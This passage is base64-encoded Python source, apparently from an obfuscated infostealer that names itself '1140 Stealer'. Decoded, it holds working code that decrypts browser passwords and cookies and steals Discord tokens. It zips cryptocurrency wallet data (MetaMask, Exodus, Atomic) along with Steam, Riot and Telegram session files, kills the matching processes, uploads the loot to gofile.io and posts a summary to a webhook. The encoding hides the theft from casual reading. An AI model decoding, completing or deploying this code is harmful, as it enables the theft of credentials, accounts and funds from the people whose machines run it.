ZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOiAKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpCiAgICAgICAgICAgIFA0c3N3LmFwcGVuZChmIlVSMToge3Jvd1swXX0gfCBVNTNSTjRNMzoge3Jvd1sxXX0gfCBQNDU1VzBSRDoge0Qza3J5cHRWNGxVMyhyb3dbMl0sIG1hc3Rlcl9rZXkpfSIpCiAgICAgICAgICAgIFA0c3N3Q291bnQgKz0gMQogICAgd3IxdGVmMHJmMWwzKFA0c3N3LCAncGFzc3cnKQoKQzAwazEzID0gW10gICAgCmRlZiBnZXRDMDBrMTMocGF0aCwgYXJnKToKICAgIGdsb2JhbCBDMDBrMTMsIENvb2tpQ291bnQKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCiAgICAKICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvQ29va2llcyIKICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCiAgICAKICAgIHRlbXBmb2xkID0gdGVtcCArICJiYnkiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiIKICAgIAogICAgc2h1dGlsLmNvcHkyKHBhdGhDLCB0ZW1wZm9sZCkKICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkKICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIGVuY3J5cHRlZF92YWx1ZSBGUk9NIGNvb2tpZXMiKQogICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29ubi5jbG9zZSgpCiAgICBvcy5yZW1vdmUodGVtcGZvbGQpCgogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgogICAgCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pCiAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQoKICAgIGZvciByb3cgaW4gZGF0YTogCiAgICAgICAgaWYgcm93WzBdICE9ICcnOgogICAgICAgICAgICBmb3Igd2EgaW4ga2V5d29yZDoKICAgICAgICAgICAgICAgIG9sZCA9IHdhCiAgICAgICAgICAgICAgICBpZiAiaHR0cHMiIGluIHdhOgogICAgICAgICAgICAgICAgICAgIHRtcCA9IHdhCiAgICAgICAgICAgICAgICAgICAgd2EgPSB0bXAuc3BsaXQoJ1snKVsxXS5zcGxpdCgnXScpWzBdCiAgICAgICAgICAgICAgICBpZiB3YSBpbiByb3dbMF06CiAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9sZCBpbiBjb29raVdvcmRzOiBjb29raVdvcmRzLmFwcGVuZChvbGQpCiAgICAgICAgICAgIEMwMGsxMy5hcHBlbmQoZiJ7cm93WzBdfQlUUlVFCS8JRkFMU0UJMjU5NzU3MzQ1Ngl7cm93WzFdfQl7RDNrcnlwdFY0bFUzKHJvd1syXSwgbWFzdGVyX2tleSl9IikKICAgICAgICAgICAgQ29va2lDb3VudCArPSAxCiAgICB3cjF0ZWYwcmYxbDMoQzAwazEzLCAnY29vaycpCgpkZWYgRzN0RDFzYzByZChwYXRoLCBhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGYie3BhdGh9L0xvY2FsIFN0YXRlIik6IHJldHVybgoKICAgIHBhdGhDID0gcGF0aCArIGFyZwoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCiAgICAjIHByaW50KHBhdGgsIG1hc3Rlcl9rZXkpCiAgICAKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgICMgcHJpbnQocGF0aCwgZmlsZSkKICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aEN9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICBmb3IgdDBrM24gaW4gcmUuZmluZGFsbChyImRRdzR3OVdnWGNROlteLipcWycoLiopJ1xdLiokXVteXCJdKiIsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUMGszbnMKICAgICAgICAgICAgICAgICAgICB0MGszbkRlY29kZWQgPSBEM2tyeXB0VjRsVTMoYjY0ZGVjb2RlKHQwazNuLnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIG1hc3Rlcl9rZXkpCiAgICAgICAgICAgICAgICAgICAgaWYgY2gxY2tUNGsxbih0MGszbkRlY29kZWQpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdDBrM25EZWNvZGVkIGluIFQwazNuczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUMGszbnMgKz0gdDBrM25EZWNvZGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHdyaXRlZm9yZmlsZShUb2tlbnMsICd0b2tlbnMnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsMDVkVDRrMzEodDBrM25EZWNvZGVkLCBwYXRoKQoKZGVmIEdhdGhlclppcHMocGF0aHMxLCBwYXRoczIsIHBhdGhzMyk6CiAgICB0aHR0aHQgPSBbXQogICAgZm9yIHBhdHQgaW4gcGF0aHMxOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aMXBUaDFuZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIHRodHRodC5hcHBlbmQoYSkKCiAgICBmb3IgcGF0dCBpbiBwYXRoczI6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVoxcFRoMW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFsyXSwgcGF0dFsxXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgdGh0dGh0LmFwcGVuZChhKQogICAgCiAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGVsZWdyYW0sIGFyZ3M9W3BhdGhzM1swXSwgcGF0aHMzWzJdLCBwYXRoczNbMV1dKQogICAgYS5zdGFydCgpCiAgICB0aHR0aHQuYXBwZW5kKGEpCgogICAgZm9yIHRocmVhZCBpbiB0aHR0aHQ6IAogICAgICAgIHRocmVhZC5qb2luKCkKICAgIGdsb2JhbCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwCiAgICAgICAgIyBwcmludChXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwKQoKICAgIHdhbCwgZ2EsIG90ID0gIiIsJycsJycKICAgIGlmIG5vdCBsZW4oV2FsbGV0c1ppcCkgPT0gMDoKICAgICAgICB3YWwgPSAiOmNvaW46ICDigKIgIFdhbGxldHNcbiIKICAgICAgICBmb3IgaSBpbiBXYWxsZXRzWmlwOgogICAgICAgICAgICB3YWwgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIgogICAgaWYgbm90IGxlbihXYWxsZXRzWmlwKSA9PSAwOgogICAgICAgIGdhID0gIjp2aWRlb19nYW1lOiAg4oCiICBHYW1pbmc6XG4iCiAgICAgICAgZm9yIGkgaW4gR2FtaW5nWmlwOgogICAgICAgICAgICBnYSArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iCiAgICBpZiBub3QgbGVuKE90aGVyWmlwKSA9PSAwOgogICAgICAgIG90ID0gIjp0aWNrZXRzOiAg4oCiICBBcHBzXG4iCiAgICAgICAgZm9yIGkgaW4gT3RoZXJaaXA6CiAgICAgICAgICAgIG90ICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiIgICAgICAgICAgCiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICAKICAgIGRhdGEgPSB7CiAgICAgICAgImNvbnRlbnQiOiBnbG9iYWxJbmZvKCksCiAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgewogICAgICAgICAgICAidGl0bGUiOiAiMTE0MCBaaXBzIiwKICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiJ7d2FsfVxue2dhfVxue290fSIsCiAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6ICIxMTQwIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwODkzMDg5NTcxNTczNzE5MjQvMTEwMjYyMzUxODI2MjI5NjYzNy9COEIyQzA1NC05Njk2LTQyQTEtODVGMy00RkNERUY0MDhCOTIuanBnIgogICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJ1c2VybmFtZSI6ICIxMTQwIFN0ZWFsZXIiLAogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzEwODkzMDg5NTcxNTczNzE5MjQvMTEwMjYyMzUxODI2MjI5NjYzNy9COEIyQzA1NC05Njk2LTQyQTEtODVGMy00RkNERUY0MDhCOTIuanBnIiwKICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgfQogICAgTDA0ZHVybDFiKHdoMDBrLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCgo='
destiny = 'CmRlZiBaaXBUZWxlZ3JhbShwYXRoLCBhcmcsIHByb2NjKToKICAgIGdsb2JhbCBPdGhlclppcAogICAgcGF0aEMgPSBwYXRoCiAgICBuYW1lID0gYXJnCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQoKICAgIHpmID0gWmlwRmlsZShmIntwYXRoQ30ve25hbWV9LnppcCIsICJ3IikKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgIGlmIG5vdCAiLnppcCIgaW4gZmlsZSBhbmQgbm90ICJ0ZHVtbXkiIGluIGZpbGUgYW5kIG5vdCAidXNlcl9kYXRhIiBpbiBmaWxlIGFuZCBub3QgIndlYnZpZXciIGluIGZpbGU6IAogICAgICAgICAgICB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpCiAgICB6Zi5jbG9zZSgpCgogICAgbG5payA9IHVwbG9hZFRvQW5vbmZpbGVzKGYne3BhdGhDfS97bmFtZX0uemlwJykKICAgICNsbmlrID0gImh0dHBzOi8vZ29vZ2xlLmNvbSIKICAgIG9zLnJlbW92ZShmIntwYXRoQ30ve25hbWV9LnppcCIpCiAgICBPdGhlclppcC5hcHBlbmQoW2FyZywgbG5pa10pCgpkZWYgWjFwVGgxbmdzKHBhdGgsIGFyZywgcHJvY2MpOgogICAgcGF0aEMgPSBwYXRoCiAgICBuYW1lID0gYXJnCiAgICBnbG9iYWwgV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcAogICAgIyBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQogICAgIyBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIpCgogICAgaWYgIm5rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgbmFtZSA9IGYiTWV0YW1hc2tfe2Jyb3dzZXJ9IgogICAgICAgIHBhdGhDID0gcGF0aCArIGFyZwogICAgCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQoKICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiTmF0aW9uc0dsb3J5IiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgbmFtZSA9IGYie2Jyb3dzZXJ9IgoKICAgIGVsaWYgIlN0ZWFtIiBpbiBhcmc6CiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIpOiByZXR1cm4KICAgICAgICBmID0gb3BlbihmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiLCAicisiLCBlbmNvZGluZz0idXRmOCIpCiAgICAgICAgZGF0YSA9IGYucmVhZGxpbmVzKCkKICAgICAgICAjIHByaW50KGRhdGEpCiAgICAgICAgZm91bmQgPSBGYWxzZQogICAgICAgIGZvciBsIGluIGRhdGE6CiAgICAgICAgICAgIGlmICdSZW1lbWJlclBhc3N3b3JkIlx0XHQiMSInIGluIGw6CiAgICAgICAgICAgICAgICBmb3VuZCA9IFRydWUKICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuCiAgICAgICAgbmFtZSA9IGFyZwoKCiAgICB6ZiA9IFppcEZpbGUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiLCAidyIpCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGU6IHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkKICAgIHpmLmNsb3NlKCkKCiAgICBsbmlrID0gdXBsb2FkVG9Bbm9uZmlsZXMoZid7cGF0aEN9L3tuYW1lfS56aXAnKQogICAgI2xuaWsgPSAiaHR0cHM6Ly9nb29nbGUuY29tIgogICAgb3MucmVtb3ZlKGYie3BhdGhDfS97bmFtZX0uemlwIikKCiAgICBpZiAiV2FsbGV0IiBpbiBhcmcgb3IgImVvZ2FlYW9laGxlZiIgaW4gYXJnOgogICAgICAgIFdhbGxldHNaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkKICAgIGVsaWYgIk5hdGlvbnNHbG9yeSIgaW4gbmFtZSBvciAiU3RlYW0iIGluIG5hbWUgb3IgIlJpb3RDbGkiIGluIG5hbWU6CiAgICAgICAgR2FtaW5nWmlwLmFwcGVuZChbbmFtZSwgbG5pa10pCiAgICBlbHNlOgogICAgICAgIE90aGVyWmlwLmFwcGVuZChbbmFtZSwgbG5pa10pCgoKZGVmIEdhdGhlckFsbCgpOgogICAgJyAgICAgICAgICAgICAgICAgICBEZWZhdWx0IFBhdGggPCAwID4gICAgICAgICAgICAgICAgICAgICAgICAgUHJvY2VzTmFtZSA8IDEgPiAgICAgICAgVG9rZW4gIDwgMiA+ICAgICAgICAgICAgICBQYXNzd29yZCA8IDMgPiAgICAgQ29va2llcyA8IDQgPiAgICAgICAgICAgICAgICAgICAgICAgICAgRXh0ZW50aW9ucyA8IDUgPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnCiAgICBicm93c2VyUGF0aHMgPSBbCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIEdYIFN0YWJsZSIsICAgICAgICAgICAgICAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgU3RhYmxlIiwgICAgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBOZW9uL1VzZXIgRGF0YS9EZWZhdWx0IiwgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAgImNocm9tZS5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgU3hTL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICJicmF2ZS5leGUiLCAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9ZYW5kZXgvWWFuZGV4QnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgInlhbmRleC5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0hvdWdhQm91Z2EvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L01pY3Jvc29mdC9FZGdlL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAiZWRnZS5leGUiLCAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdCiAgICBdCgogICAgZGlzY29yZFBhdGhzID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9EaXNjb3JkIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgICAgICBbZiJ7cm9hbWluZ30vTGlnaHRjb3JkIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgICAgICBbZiJ7cm9hbWluZ30vZGlzY29yZGNhbmFyeSIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L2Rpc2NvcmRwdGIiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgXQoKICAgIFBhdGhzVG9aaXAgPSBbCiAgICAgICAgW2Yie3JvYW1pbmd9L2F0b21pYy9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAnIkF0b21pYyBXYWxsZXQuZXhlIicsICJXYWxsZXQiXSwKICAgICAgICBbZiJ7cm9hbWluZ30vRXhvZHVzL2V4b2R1cy53YWxsZXQiLCAiRXhvZHVzLmV4ZSIsICJXYWxsZXQiXSwKICAgICAgICBbIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcU3RlYW1cY29uZmlnIiwgInN0ZWFtLmV4ZSIsICJTdGVhbSJdLAogICAgICAgIFtmIntyb2FtaW5nfS9OYXRpb25zR2xvcnkvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgIk5hdGlvbnNHbG9yeS5leGUiLCAiTmF0aW9uc0dsb3J5Il0sCiAgICAgICAgW2Yie2xvY2FsfS9SaW90IEdhbWVzL1Jpb3QgQ2xpZW50L0RhdGEiLCAiUmlvdENsaWVudFNlcnZpY2VzLmV4ZSIsICJSaW90Q2xpZW50Il0KICAgIF0KICAgIFRlbGVncmFtID0gW2Yie3JvYW1pbmd9L1RlbGVncmFtIERlc2t0b3AvdGRhdGEiLCAndGVsZWdyYW0uZXhlJywgIlRlbGVncmFtIl0KCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6IAogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRUMGszbiwgYXJncz1bcGF0dFswXSwgcGF0dFsyXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkKICAgIGZvciBwYXR0IGluIGRpc2NvcmRQYXRoczogCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUczdEQxc2MwcmQsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMV1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCgogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOiAKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0UDRzc3csIGFyZ3M9W3BhdHRbMF0sIHBhdHRbM11dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCgogICAgVGhDb2trID0gW10KICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczogCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldEMwMGsxMywgYXJncz1bcGF0dFswXSwgcGF0dFs0XV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgVGhDb2trLmFwcGVuZChhKQoKICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUdhdGhlclppcHMsIGFyZ3M9W2Jyb3dzZXJQYXRocywgUGF0aHNUb1ppcCwgVGVsZWdyYW1dKS5zdGFydCgpCgoKICAgIGZvciB0aHJlYWQgaW4gVGhDb2trOiB0aHJlYWQuam9pbigpCiAgICBERVRFQ1RFRCA9IFRSNnN0KEMwMGsxMykKICAgIGlmIERFVEVDVEVEID09IFRydWU6IHJldHVybgoKICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoKICAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WjFwVGgxbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzVdLCBwYXR0WzFdXSkuc3RhcnQoKQogICAgCiAgICBmb3IgcGF0dCBpbiBQYXRoc1RvWmlwOgogICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aMXBUaDFuZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpCiAgICAKICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRlbGVncmFtLCBhcmdzPVtUZWxlZ3JhbVswXSwgVGVsZWdyYW1bMl0sIFRlbGVncmFtWzFdXSkuc3RhcnQoKQoKICAgIGZvciB0aHJlYWQgaW4gVGhyZWFkbGlzdDogCiAgICAgICAgdGhyZWFkLmpvaW4oKQogICAgZ2xvYmFsIHVwdGhzCiAgICB1cHRocyA9IFtdCgogICAgZm9yIGZpbGUgaW4gWyJiYnlwYXNzdy50eHQiLCAiYmJ5Y29vay50eHQiXTogCiAgICAgICAgIyB1cGxvYWQob3MuZ2V0ZW52KCJURU1QIikgKyAiXFwiICsgZmlsZSkKICAgICAgICB1cGxvYWQoZmlsZS5yZXBsYWNlKCIudHh0IiwgIiIpLCB1cGxvYWRUb0Fub25maWxlcyhvcy5nZXRlbnYoIlRFTVAiKSArICJcXCIgKyBmaWxlKSkKCmRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKToKICAgIHRyeTpyZXR1cm4gcmVxdWVzdHMucG9zdChmJ2h0dHBzOi8ve3JlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuZ29maWxlLmlvL2dldFNlcnZlciIpLmpzb24oKVsiZGF0YSJdWyJzZXJ2ZXIiXX0uZ29maWxlLmlvL3VwbG9hZEZpbGUnLCBmaWxlcz17J2ZpbGUnOiBvcGVuKHBhdGgsICdyYicpfSkuanNvbigpWyJkYXRhIl1bImRvd25sb2FkUGFnZSJdCiAgICBleGNlcHQ6cmV0dXJuIEZhbHNlCgojIGRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKTpzCiMgICAgIHRyeToKIyAgICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0KIyAgICAgICAgIHVwbG9hZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdHJhbnNmZXIuc2gvIiwgZmlsZXM9ZmlsZXMpCiMgICAgICAgICB1cmwgPSB1cGxvYWQudGV4dAojICAgICAgICAgcmV0dXJuIHVybAojICAgICBleGNlcHQ6CiMgICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBLaXdpRm9sZGVyKHBhdGhGLCBrZXl3b3J